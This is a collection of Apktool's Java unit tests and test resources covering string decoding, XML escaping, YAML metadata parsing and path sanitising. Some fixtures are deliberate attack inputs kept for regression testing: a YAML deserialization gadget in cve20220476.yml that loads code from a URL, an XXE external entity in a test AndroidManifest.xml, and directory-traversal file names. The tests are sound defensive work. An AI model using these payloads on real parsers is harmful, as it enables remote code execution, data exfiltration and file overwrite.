 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class AaptVersionTest extends BaseTest {

    @Test
    public void testAapt2Iterations() throws Exception {
        assertEquals(2, AaptManager.getVersionFromString("Android Asset Packaging Tool (aapt) 2:17"));
        assertEquals(2, AaptManager.getVersionFromString("Android Asset Packaging Tool (aapt) 2.17"));
        assertEquals(1, AaptManager.getVersionFromString("Android Asset Packaging Tool, v0.9"));
        assertEquals(1, AaptManager.getVersionFromString("Android Asset Packaging Tool, v0.2-2679779"));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/res/data/StringPoolWithSurrogatePairInUtf8Test.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.BaseTest;

import java.nio.charset.StandardCharsets;

import org.junit.*;
import static org.junit.Assert.*;

public class StringPoolWithSurrogatePairInUtf8Test extends BaseTest {

    @Test
    public void decodeSingleOctet() {
        byte[] bytes = "abcDEF123".getBytes(StandardCharsets.UTF_8);
        String actual = new ResStringPool(bytes, true).decodeString(0, 9);
        assertEquals("Incorrect decoding", "abcDEF123", actual);
    }

    @Test
    public void decodeTwoOctets() {
        byte[] bytes0 = { (byte) 0xC2, (byte) 0x80 };
        String actual0 = new ResStringPool(bytes0, true).decodeString(0, 2);
        assertEquals("Incorrect decoding", "\u0080", actual0);

        byte[] bytes1 = { (byte) 0xDF, (byte) 0xBF };
        String actual1 = new ResStringPool(bytes1, true).decodeString(0, 2);
        assertEquals("Incorrect decoding", "\u07FF", actual1);
    }

    @Test
    public void decodeThreeOctets() {
        byte[] bytes0 = { (byte) 0xE0, (byte) 0xA0, (byte) 0x80 };
        String actual0 = new ResStringPool(bytes0, true).decodeString(0, 3);
        assertEquals("Incorrect decoding", "\u0800", actual0);

        byte[] bytes1 = { (byte) 0xEF, (byte) 0xBF, (byte) 0xBF };
        String actual1 = new ResStringPool(bytes1, true).decodeString(0, 3);
        assertEquals("Incorrect decoding", "\uFFFF", actual1);
    }

    @Test
    public void decodeSurrogatePair_when_givesAsThreeOctetsFromInvalidRangeOfUtf8() {
        // See: https://github.com/iBotPeaches/Apktool/issues/2299
        byte[] bytes0 = { (byte) 0xED, (byte) 0xA0, (byte) 0xBD, (byte) 0xED, (byte) 0xB4, (byte) 0x86 };
        String actual0 = new ResStringPool(bytes0, true).decodeString(0, 6);
        assertEquals("Incorrect decoding", "\uD83D\uDD06", actual0);

        // See: https://github.com/iBotPeaches/Apktool/issues/2546
        // Bytes with characters before surrogate pair
        byte[] bytes1 = {
            'G', 'o', 'o', 'd', ' ', 'm', 'o', 'r', 'n', 'i', 'n', 'g', '!', ' ',
            (byte) 0xED, (byte) 0xA0, (byte) 0xBD, (byte) 0xED, (byte) 0xB1, (byte) 0x8B,
            ' ', 'S', 'u', 'n', ' ',
            (byte) 0xED, (byte) 0xA0, (byte) 0xBC, (byte) 0xED, (byte) 0xBC, (byte) 0x9E
        };
        String actual1 = new ResStringPool(bytes1, true).decodeString(0, 31);
        // D83D -> 0xED 0xA0 0xBD
        // DC4B -> 0xED 0xB1 0x8B
        // D83C -> 0xED 0xA0 0xBC
        // DF1E -> 0xED 0xBC 0x9E
        assertEquals("Incorrect decoding when there are valid characters before the surrogate pair",
                "Good morning! \uD83D\uDC4B Sun \uD83C\uDF1E", actual1);
    }

    @Test
    public void decodeSurrogatePair_when_givesAsThreeOctetsFromTheValidRangeOfUtf8() {
        // \u10FFFF is encoded in UTF-8 as "0xDBFF 0xDFFF" (4-byte encoding),
        // but when used in Android resources which are encoded in UTF-8, 3-byte encoding is used,
        // so each of these is encoded as 3-bytes
        byte[] bytes = { (byte) 0xED, (byte) 0xAF, (byte) 0xBF, (byte) 0xED, (byte) 0xBF, (byte) 0xBF };
        String actual = new ResStringPool(bytes, true).decodeString(0, 6);
        assertEquals("Incorrect decoding", "\uDBFF\uDFFF", actual);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/res/decoder/MissingDiv9PatchTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.BaseTest;
import brut.androlib.res.data.NinePatchData;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.File;
import java.nio.file.Files;

import org.junit.*;
import static org.junit.Assert.*;

public class MissingDiv9PatchTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(MissingDiv9PatchTest.class, "res/decoder/issue1522", sTmpDir);
    }

    @Test
    public void assertMissingDivAdded() throws Exception {
        File file = new File(sTmpDir, "pip_dismiss_scrim.9.png");
        byte[] data;

        try (InputStream in = Files.newInputStream(file.toPath())) {
            ResNinePatchStreamDecoder decoder = new ResNinePatchStreamDecoder();
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            decoder.decode(in, out);
            data = out.toByteArray();
        }

        BufferedImage image = ImageIO.read(new ByteArrayInputStream(data));
        int height = image.getHeight() - 1;

        // First and last pixel will be invisible, so let's check the first column and ensure its all black.
        for (int y = 1; y < height; y++) {
            assertEquals("y coordinate failed at: " + y, NinePatchData.COLOR_TICK, image.getRGB(0, y));
        }
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/res/xml/EscapeXmlValueTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class EscapeXmlValueTest extends BaseTest {

    @Test
    public void escapeXmlValueTest() {
        assertEquals("foo", escape("foo"));
        assertEquals("\"'foo'\"", escape("'foo'"));
        assertEquals("\\\"foo\\\"", escape("\"foo\""));
        assertEquals("foo&amp;bar", escape("foo&bar"));
        assertEquals("&lt;foo>", escape("<foo>"));
        assertEquals("&lt;![CDATA[foo]]&gt;", escape("<![CDATA[foo]]>"));
    }

    private static String escape(String value) {
        return ResStringEncoder.encodeTextValue(value);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/res/xml/PositionalSpecifiersTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class PositionalSpecifiersTest extends BaseTest {

    @Test
    public void noSpecifiersTest() {
        assertEquals("test", normalize("test"));
    }

    @Test
    public void twoSpecifiersTest() {
        assertEquals("%1$s, %2$s, and 1 other.", normalize("%s, %s, and 1 other."));
    }

    @Test
    public void twoPositionalSpecifiersTest() {
        assertEquals("%1$s, %2$s and 1 other", normalize("%1$s, %2$s and 1 other"));
    }

    @Test
    public void threeSpecifiersTest() {
        assertEquals("%1$s, %2$s, and %3$d other.", normalize("%s, %s, and %d other."));
    }

    @Test
    public void threePositionalSpecifiersTest() {
        assertEquals(" %1$s, %2$s and %3$d other", normalize(" %1$s, %2$s and %3$d other"));
    }

    @Test
    public void fourSpecifiersTest() {
        assertEquals("%1$s, %2$s, and %3$d other and %4$d.", normalize("%s, %s, and %d other and %d."));
    }

    @Test
    public void fourPositionalSpecifiersTest() {
        assertEquals(" %1$s, %2$s and %3$d other and %4$d.", normalize(" %1$s, %2$s and %3$d other and %4$d."));
    }

    private String normalize(String value) {
        return ResStringEncoder.normalizeFormatSpecifiers(value);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/util/InvalidDirectoryTraversalTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.util;

import brut.androlib.BaseTest;
import brut.util.BrutIO;
import brut.util.OSDetection;

import java.io.File;
import java.nio.file.InvalidPathException;

import org.junit.*;
import static org.junit.Assert.*;

public class InvalidDirectoryTraversalTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(InvalidDirectoryTraversalTest.class, "util/traversal", sTmpDir);
    }

    @Test
    public void validFileTest() throws Exception {
        String validFileName = BrutIO.sanitizePath(sTmpDir, "file");
        assertEquals(validFileName, "file");
        assertTrue(new File(sTmpDir, validFileName).isFile());
    }

    @Test(expected = InvalidPathException.class)
    public void invalidBackwardFileTest() throws Exception {
        BrutIO.sanitizePath(sTmpDir, "../file");
    }

    @Test(expected = InvalidPathException.class)
    public void invalidRootFileTest() throws Exception {
        String rootLocation = OSDetection.isWindows() ? "C:/" : File.separator;
        BrutIO.sanitizePath(sTmpDir, rootLocation + "file");
    }

    @Test(expected = InvalidPathException.class)
    public void noFilePassedTest() throws Exception {
        BrutIO.sanitizePath(sTmpDir, "");
    }

    @Test(expected = InvalidPathException.class)
    public void invalidBackwardPathOnWindows() throws Exception {
        String invalidPath = OSDetection.isWindows() ? "..\\..\\app.exe" : "../../app";
        BrutIO.sanitizePath(sTmpDir, invalidPath);
    }

    @Test
    public void validDirectoryFileTest() throws Exception {
        String fileName = "dir" + File.separator + "file";
        String validFileName = BrutIO.sanitizePath(sTmpDir, fileName);
        assertEquals(fileName, validFileName);
    }
}

```

`brut.apktool/apktool-lib/src/test/resources/doctype/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE manifest [<!ENTITY e1 SYSTEM 'http://ibotpeaches.com?z=APKTOOLXXE;'>]>
<manifest hardwareAccelerated="true" package="com.ibotpeaches.doctype" platformBuildVersionCode="24" platformBuildVersionName="6.0-2456767" xmlns:android="http://schemas.android.com/apk/res/android">
    &e1;
<supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:resizeable="true" android:smallScreens="true" android:xlargeScreens="true"/>
</manifest>
```

`brut.apktool/apktool-lib/src/test/resources/doctype/apktool.yml`:

```yml
version: 2.0.0
apkFileName: doctype.apk
usesFramework:
  ids:
  - 1
resourcesInfo:
  packageId: 127
versionInfo:
  versionCode: 1
  versionName: 1.0
```

`brut.apktool/apktool-lib/src/test/resources/issue1481/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue1481.jar
```

`brut.apktool/apktool-lib/src/test/resources/issue1481/smali/com/ibotpeaches/issue1481/BuildConfig.smali`:

```smali
.class public final Lcom/ibotpeaches/issue1481/BuildConfig;
.super Ljava/lang/Object;
.source "BuildConfig.java"


# static fields
.field public static final APPLICATION_ID:Ljava/lang/String; = "com.ibotpeaches.issue1481"

.field public static final BUILD_TYPE:Ljava/lang/String; = "debug"

.field public static final DEBUG:Z

.field public static final FLAVOR:Ljava/lang/String; = ""

.field public static final VERSION_CODE:I = 0x1

.field public static final VERSION_NAME:Ljava/lang/String; = "1.0"


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 7
    const-string v0, "true"

    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v0

    sput-boolean v0, Lcom/ibotpeaches/issue1481/BuildConfig;->DEBUG:Z

    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .prologue
    .line 6
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-false/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.ibotpeaches.issue2328" xmlns:android="http://schemas.android.com/apk/res/android" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038">
<application android:debuggable="false"/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-false/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2328.apk
usesFramework:
  ids:
  - 1
resourcesInfo:
  packageId: 127
versionInfo:
  versionCode: 1
  versionName: 1.0
```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-false/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-missing/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.ibotpeaches.issue2328" xmlns:android="http://schemas.android.com/apk/res/android" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038">
<application/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-missing/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2328.apk
usesFramework:
  ids:
  - 1
resourcesInfo:
  packageId: 127
versionInfo:
  versionCode: 1
  versionName: 1.0
```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-missing/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-true/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.ibotpeaches.issue2328" xmlns:android="http://schemas.android.com/apk/res/android" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038">
<application android:debuggable="true"/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-true/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2328.apk
usesFramework:
  ids:
  - 1
resourcesInfo:
  packageId: 127
versionInfo:
  versionCode: 1
  versionName: 1.0
```

`brut.apktool/apktool-lib/src/test/resources/issue2328/debuggable-true/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/issue2543/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2543.jar
```

`brut.apktool/apktool-lib/src/test/resources/meta/basic.yml`:

```yml
apkFileName: basic.apk
doNotCompress:
    - arsc
    - png
resourcesInfo:
    packageId: 127
    packageName: com.test.basic
    sparseEntries: true
sdkInfo:
    minSdkVersion: 4
    targetSdkVersion: 22
    maxSdkVersion: 30
usesFramework:
    ids:
        - 1
    tag: tag
version: 2.8.0
versionInfo:
    versionCode: 71
    versionName: 1.0.70

```

`brut.apktool/apktool-lib/src/test/resources/meta/cve20220476.yml`:

```yml
apkFileName: cve20220476.apk
some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://127.0.0.1:8000"]]]]
doNotCompress:
- arsc
resourcesInfo:
  packageId: 127
sdkInfo:
  minSdkVersion: 25
  targetSdkVersion: 30
usesFramework:
  ids:
  - 1
version: 2.6.1-ddc4bb-SNAPSHOT

```

`brut.apktool/apktool-lib/src/test/resources/meta/donotcompress_with_hieroglyph.yml`:

```yml
version: 2.0.0
apkFileName: testapp.apk
doNotCompress:
- assets/AllAssetBundles/Andriod/tx_1001_冰原1
- assets/AllAssetBundles/Andriod/tx_1001_冰原1.manifest


```

`brut.apktool/apktool-lib/src/test/resources/meta/first_incorrect_indent.yml`:

```yml
  version: 2.0.0
apkFileName: standard.apk
doNotCompress:
- arsc
resourcesInfo:
  packageId: 127
  packageName: null
  sparseEntries: false
sdkInfo:
  minSdkVersion: 25
  targetSdkVersion: 30
usesFramework:
  ids:
  - 1
  tag: null
versionInfo:
  versionCode: -1
  versionName: null

```

`brut.apktool/apktool-lib/src/test/resources/meta/list_with_indent.yml`:

```yml
apkFileName: basic.apk
doNotCompress:
    - arsc
    - png
resourcesInfo:
    packageId: 127
    packageName: com.test.basic
    sparseEntries: true
sdkInfo:
    minSdkVersion: 4
    targetSdkVersion: 22
    maxSdkVersion: 30
usesFramework:
    ids:
        - 1
    tag: tag
version: 2.8.0
versionInfo:
    versionCode: 71
    versionName: 1.0.70

```

`brut.apktool/apktool-lib/src/test/resources/meta/skip_incorrect_indent.yml`:

```yml
apkFileName: standard.apk
  version: 2.0.0
doNotCompress:
- arsc
resourcesInfo:
  packageId: 127
  packageName: null
  sparseEntries: false
sdkInfo:
  minSdkVersion: 25
  targetSdkVersion: 30
usesFramework:
  ids:
  - 1
  tag: null
versionInfo:
  versionCode: -1
  versionName: null

```

`brut.apktool/apktool-lib/src/test/resources/meta/standard.yml`:

```yml
apkFileName: standard.apk
doNotCompress:
- arsc
resourcesInfo:
  packageId: 127
  packageName: null
  sparseEntries: false
sdkInfo:
  minSdkVersion: 25
  targetSdkVersion: 30
usesFramework:
  ids:
  - 1
  tag: null
version: 2.8.1
versionInfo:
  versionCode: -1
  versionName: null

```

`brut.apktool/apktool-lib/src/test/resources/meta/unknown_fields.yml`:

```yml
apkFileName: standard.apk
test: test
doNotCompress:
- arsc
resourcesInfo:
  packageId: 127
  packageName: null
  sparseEntries: false
  test2: test2
sdkInfo:
  minSdkVersion: 25
  targetSdkVersion: 30
usesFramework:
  ids:
  - 1
  tag: null
  test3: test3
version: 2.8.1
versionInfo:
  versionCode: -1
  versionName: null

```

`brut.apktool/apktool-lib/src/test/resources/meta/unknown_files.yml`:

```yml
version: 2.0.0
apkFileName: testapp.apk
usesFramework:
  ids:
  - 1
resourcesInfo:
  packageId: 127
versionInfo:
  versionCode: 1
  versionName: 1.0
doNotCompress:
- assets/0byte_file.jpg
- arsc
- png
- mp3
- stored.file

```

`brut.apktool/apktool-lib/src/test/resources/network_config/existing/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="brut.apktool.testapp" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
    <application>
        android:networkSecurityConfig="@xml/network_security_config"
    </application>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/network_config/existing/apktool.yml`:

```yml
version: 2.0.0
apkFileName: testapp.apk
usesFramework:
  ids:
  - 1
versionInfo:
  versionCode: 1
  versionName: 1.0

```

`brut.apktool/apktool-lib/src/test/resources/network_config/existing/res/values/public.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="hello_world" id="0x7f020000" />
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/network_config/existing/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/network_config/existing/res/xml/network_security_config.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">example.com</domain>
        <pin-set>
            <pin digest="SHA-256">OEJax6JVAMiUP7wzOiLPU7KW38Cdx3afNZOYR2iOFZ4=</pin>
        </pin-set>
        <trust-anchors>
            <certificates src="user" />
        </trust-anchors>
    </domain-config>
</network-security-config>

```

`brut.apktool/apktool-lib/src/test/resources/network_config/existing/smali/HelloWorld.smali`:

```smali
.class public LHelloWorld;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/network_config/none/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="brut.apktool.testapp" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
    <application/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/network_config/none/apktool.yml`:

```yml
version: 2.0.0
apkFileName: testapp.apk
usesFramework:
  ids:
  - 1
versionInfo:
  versionCode: 1
  versionName: 1.0

```

`brut.apktool/apktool-lib/src/test/resources/network_config/none/res/values/public.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="hello_world" id="0x7f020000" />
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/network_config/none/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/network_config/none/smali/HelloWorld.smali`:

```smali
.class public LHelloWorld;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/pkgid8/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="brut.apktool.aapt2.pkgid8" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415" featureName="feature">
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/pkgid8/apktool.yml`:

```yml
version: 2.0.0
apkFileName: pkgid8.apk
usesFramework:
  ids:
  - 1
resourcesInfo:
  packageId: 128
versionInfo:
  versionCode: 1
  versionName: 1.0
```

`brut.apktool/apktool-lib/src/test/resources/pkgid8/res/values/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <integer name="foo3">117</integer>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/pkgid8/res/values/public.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="foo1" id="0x80020000" />
    <public type="string" name="foo2" id="0x80020001" />
    <public type="integer" name="foo3" id="0x80030000" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/pkgid8/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="foo1">foo</string>
    <string name="foo2">bar</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:appCategory="game" package="brut.apktool.testapp" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
    <uses-feature android:glEsVersion="0x20000" />
    <uses-feature android:glEsVersion="0x30002" />
    <application android:label="Issue2799 &amp; B" android:enableOnBackInvokedCallback="true" android:isAccessibilityTool="false">
        <service android:name=".MyAccessibilityService" android:foregroundServiceType="shortService">
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>
        <fragment android:name=".views.Issue3427"/>
        <meta-data android:name="test_int" android:value="12345" />
        <meta-data android:name="test_int_as_string" android:value="\12345" />
    </application>
    <activity android:name=".MainActivity" android:featureFlag="brut.feature.activity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" android:usesPermissionFlags="neverForLocation" />
    <permission android:featureFlag="brut.feature.permission" android:label="Test Permission" android:name="brut.permission.TEST" android:permissionGroup="android.permission-group.UNDEFINED" android:protectionLevel="signature" />
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/apktool.yml`:

```yml
version: 2.3.2
apkFileName: testapp.apk
usesFramework:
  ids:
  - 1
versionInfo:
  versionCode: 1
  versionName: 1.0
resourcesInfo:
  packageId: 127
  sparseEntries: false
featureFlags:
  brut.feature.permission: true
  brut.feature.activity: true
doNotCompress:
- assets/0byte_file.jpg
- arsc
- png
- mp3
- stored.file

```

`brut.apktool/apktool-lib/src/test/resources/testapp/assets/txt/no-unicode.txt`:

```txt
This is an empty file.
```

`brut.apktool/apktool-lib/src/test/resources/testapp/assets/unicode-txt/∂-unicode.txt`:

```txt
∂ char.
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/drawable/$avd_hide_password__0.xml`:

```xml
<vector xmlns:android="http://schemas.android.com/apk/res/android"></vector>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/drawable/$avd_show_password__0.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<vector android:height="24.0dp" android:width="24.0dp" android:viewportWidth="24.0" android:viewportHeight="24.0"
        xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt">
</vector>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/drawable/$avd_show_password__1.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<objectAnimator android:interpolator="@android:interpolator/fast_out_linear_in" android:valueType="pathType" android:propertyName="pathData"
                xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt" />
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/drawable/$avd_show_password__2.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<objectAnimator android:interpolator="@android:interpolator/fast_out_linear_in" android:valueFrom="1" android:valueTo="0" android:propertyName="trimPathEnd"
                xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt" />
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/drawable/avd_show_password.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<animated-vector android:drawable="@drawable/$avd_show_password__0"
                 xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt">
    <target android:name="eye_mask" android:animation="@drawable/$avd_show_password__1" />
    <target android:name="strike_through" android:animation="@drawable/$avd_show_password__2" />
</animated-vector>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/font/lobster.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<font-family xmlns:android="http://schemas.android.com/apk/res/android">
    <font
        android:fontStyle="normal"
        android:fontWeight="400"
        android:font="@font/lobster_regular" />
</font-family>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/layout/issue1040.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<TextView
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:gravity="@integer/reference_test"
    />
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/layout/issue1063.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:custom="http://schemas.android.com/apk/res-auto">
    <TextView custom:test_attr11="TEST_ONE" />
    <TextView custom:test_attr11="TEST_ZERO" />
</LinearLayout>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/layout/issue1157.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen android:title="test" app:min_value="0.2" app:max_value="5.0" app:default_value="1.0"
        xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:app="http://schemas.android.com/apk/res/brut.apktool.testapp" />
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/layout/issue1274.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent">
</LinearLayout>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/layout/issue1674.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<TextView xmlns:android="http://schemas.android.com/apk/res/android" android:autoSizeTextType="uniform" />
```

